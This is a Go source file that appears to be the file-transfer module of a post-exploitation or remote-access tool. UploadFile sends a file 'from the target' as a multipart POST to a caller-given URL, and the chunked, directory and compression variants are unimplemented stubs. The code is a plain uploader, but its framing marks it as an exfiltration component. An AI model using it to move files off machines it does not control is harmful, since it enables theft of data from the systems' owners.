package transfer

import (
	"bytes"
	"fmt"
	"io"
	"mime/multipart"
	"net/http"
	"os"
	"path/filepath"
	"time"
)

// UploadFile uploads a file from the target to an HTTP server
func UploadFile(source, url string) string {
	// Validate URL
	if !isValidURL(url) {
		return fmt.Sprintf("[!] Invalid URL: %s\n", url)
	}

	// Check if source file exists
	fileInfo, err := os.Stat(source)
	if err != nil {
		return fmt.Sprintf("[!] Source file not found: %s\n", source)
	}

	if fileInfo.IsDir() {
		return fmt.Sprintf("[!] Source is a directory, not a file: %s\n", source)
	}

	// Start upload
	output := fmt.Sprintf("[*] Uploading: %s\n", source)
	output += fmt.Sprintf("[*] Destination: %s\n", url)
	output += fmt.Sprintf("[*] File size: %s\n", formatBytes(fileInfo.Size()))

	startTime := time.Now()

	// Open source file
	file, err := os.Open(source)
	if err != nil {
		return output + fmt.Sprintf("[!] Failed to open file: %v\n", err)
	}
	defer file.Close()

	// Create multipart form
	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)

	// Create form file field
	part, err := writer.CreateFormFile("file", filepath.Base(source))
	if err != nil {
		return output + fmt.Sprintf("[!] Failed to create form: %v\n", err)
	}

	// Copy file content to form
	bytesWritten, err := io.Copy(part, file)
	if err != nil {
		return output + fmt.Sprintf("[!] Failed to read file: %v\n", err)
	}

	// Close multipart writer
	err = writer.Close()
	if err != nil {
		return output + fmt.Sprintf("[!] Failed to finalize form: %v\n", err)
	}

	output += fmt.Sprintf("[*] Bytes prepared: %s\n", formatBytes(bytesWritten))
	output += fmt.Sprintf("[*] Sending request...\n")

	// Create HTTP client with timeout
	client := &http.Client{
		Timeout: 10 * time.Minute, // 10 minute timeout for large uploads
	}

	// Create POST request
	req, err := http.NewRequest("POST", url, body)
	if err != nil {
		return output + fmt.Sprintf("[!] Failed to create request: %v\n", err)
	}

	// Set content type with boundary
	req.Header.Set("Content-Type", writer.FormDataContentType())

	// Send request
	resp, err := client.Do(req)
	if err != nil {
		return output + fmt.Sprintf("[!] Upload failed: %v\n", err)
	}
	defer resp.Body.Close()

	duration := time.Since(startTime)

	// Read response body
	respBody, err := io.ReadAll(resp.Body)
	if err != nil {
		output += fmt.Sprintf("[!] Failed to read response: %v\n", err)
	}

	// Check response status
	if resp.StatusCode >= 200 && resp.StatusCode < 300 {
		output += fmt.Sprintf("[+] Upload successful!\n")
		output += fmt.Sprintf("    Status: %d %s\n", resp.StatusCode, resp.Status)
		output += fmt.Sprintf("    Duration: %s\n", duration.Round(time.Millisecond))

		if duration.Seconds() > 0 {
			speed := float64(bytesWritten) / duration.Seconds()
			output += fmt.Sprintf("    Speed: %s/s\n", formatBytes(int64(speed)))
		}

		// Show server response if present
		if len(respBody) > 0 && len(respBody) < 500 {
			output += fmt.Sprintf("    Server response: %s\n", string(respBody))
		}
	} else {
		output += fmt.Sprintf("[!] Upload failed with status: %d %s\n",
			resp.StatusCode, resp.Status)

		if len(respBody) > 0 && len(respBody) < 500 {
			output += fmt.Sprintf("    Server response: %s\n", string(respBody))
		}
	}

	return output
}

// UploadFileChunked uploads large files in chunks (alternative for very large files)
// Not implemented by default to keep code simple, but can be added if needed
func UploadFileChunked(source, url string, chunkSize int64) string {
	// This would split the file into chunks and upload sequentially
	// Useful for files >100MB or unreliable connections
	// Implementation placeholder
	return fmt.Sprintf("[!] Chunked upload not yet implemented. Use regular upload.\n")
}

// UploadDirectory recursively uploads a directory (future enhancement)
func UploadDirectory(source, url string) string {
	// This would zip the directory and upload as single file
	// Or upload files one by one
	// Implementation placeholder
	return fmt.Sprintf("[!] Directory upload not yet implemented.\n" +
		"    Tip: Zip the directory first, then upload the zip file.\n")
}

// CompressAndUpload compresses a file/directory before uploading
// Useful for large text files or logs
func CompressAndUpload(source, url string) string {
	// This would gzip the file before uploading
	// Reduces bandwidth for compressible files
	// Implementation placeholder
	return fmt.Sprintf("[!] Compression not yet implemented. Upload raw file.\n")
}
